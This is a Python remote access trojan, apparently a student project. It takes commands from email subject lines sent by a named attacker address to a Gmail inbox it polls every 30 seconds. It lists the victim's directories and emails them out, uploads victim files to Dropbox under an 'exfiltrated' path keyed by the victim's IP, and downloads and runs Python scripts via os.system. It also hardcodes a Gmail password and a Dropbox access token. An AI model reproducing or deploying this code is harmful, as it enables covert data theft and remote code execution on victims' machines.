import os
import smtplib
import imaplib
import email
import time
import socket
import ssl
import dropbox

emailAdr = "os.services.updates@gmail.com"
password = "cse363esc"
SMTP_SERVER = "imap.gmail.com"
#attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
attacker_email = "William Chen <william.chen@stonybrook.edu>"
SMTP_PORT = 993
commands = []
executable_file = "pip_install.py"
auth_token = "eSp1cKEzdOAAAAAAAAAADFTKh7tVMADzEWVmHJ8Q-aOwZQcT1993aavHJF6Nwvdk"

#Get infected IP
def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    IPaddr = s.getsockname()[0]
    s.close()
    return IPaddr

#Initialize Dropbox
def init_dbx():
    dbx = dropbox.Dropbox(auth_token)

#Upload a file to dropbox
def upload_file(path):
    ip = str(getIP())
    with open(path, 'rb') as f:
        dbx.files_upload(f.read(), '/' + ip + '/exfiltrated' + path)

#Download a file from dropbox
def download_file(filePath, localname):
    with open(localname, "w") as f:
        metadata, res = dbx.files_download(path=filePath)
        f.write((res.content).decode())

#Send email with msg
def sendEmail(msg):
    port = 465  # For SSL

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(emailAdr, password)
        server.sendmail(emailAdr, attacker_email, msg)

#EMAIL SUBJECT = show [Directory path]
#NEEDS TO START WITH "C:/" UNLESS KNOWN PATH
def showFiles(com):
    dirList = []
    fileList = []
    splitCom = com.split(" ")
    del(splitCom[0])
    actualPath = splitCom[0]
    for x in os.listdir(actualPath):
        if os.path.isdir(os.path.join(actualPath, x)):
            dirList.append(x)
        elif os.path.isfile(os.path.join(actualPath, x)):
            fileList.append(x)

    directories_string = ""
    for dir in dirList:
        directories_string += dir + "\n"
    files_string = ""
    for file in fileList:
        files_string += file + "\n"
    subjectLine = "Subject: My Directory\n\n"
    payload = subjectLine
    payload += "Files:\n" + files_string + "\nDirectories:\n" + directories_string
    print(payload)
    sendEmail(payload)

#EMAIL SUBJECT = fetch [file name]
def getFile(com):
    splitCom = com.split(" ")
    del(splitCom[0])
    filePath = splitCom[0]
    upload_file(filePath)

#EMAIL SUBJECT = download [file name] [local name]
def receiveFile(com):
    splitCom = com.split(" ")
    del(splitCom[0])
    filePath = splitCom[0]
    localPath = splitCom[1]
    download_file(filePath, localPath)

#EMAIL SUBJECT = execute [file path from dropbox with python script]
def executeCom(com):
    splitCom = com.split(" ")
    del(splitCom[0])
    execCom = splitCom[0]
    download_file(execCom, executable_file)
    os.system('python ' + executable_file)
    os.remove(executable_file)
    #SEND AN EMAIL AS RECEIPT OF EXECUTION

#Parse commands from emails
def commandParser(coms):
    while coms:
        command = coms[0]
        if "show" in command:
            showFiles(command)
            del coms[0]
        elif "fetch" in command:
            getFile(command)
            del coms[0]
        elif "execute" in command:
            executeCom(command)
            del coms[0]
        elif "download" in command:
            receiveFile(command)
            del coms[0]

#Read an email
def readEmail():
    mail = imaplib.IMAP4_SSL(SMTP_SERVER)
    mail.login(emailAdr, password)
    mail.select('inbox')

    typ, data = mail.search(None, 'ALL')
    for i in data[0].split():
        typ, data = mail.fetch(i, '(RFC822)' )
        msg = email.message_from_bytes(data[0][1])
        subject = msg['Subject']
        sender = msg['From']
        mail.store(i, '+FLAGS', '\\Deleted')
        if(sender == attacker_email):
            commands.append(subject)
            print ('From : ' + sender + '\n')
            print ('Subject : ' + subject + '\n')

    if commands:
       commandParser(commands)

    mail.expunge()
    mail.close()
    mail.logout()

#Send an update ever x seconds
def periodicUpdates(seconds):
    startTime=time.time()
    while True:
        readEmail()
        message = "Subject: " + str(getIP()) + "\n\n" + "Checkin in boss"
        #sendEmail(message)
        time.sleep(seconds - ((time.time() - startTime) % seconds))

periodicUpdates(30.0)

#KEYWORDS:
#To send a file to user: download [filename] [local name]
#To receive a file from user: fetch [file name]
#To execute a python script from dropbox: execute [file path from dropbox with python script]
#To receive directory information: show [Directory path]
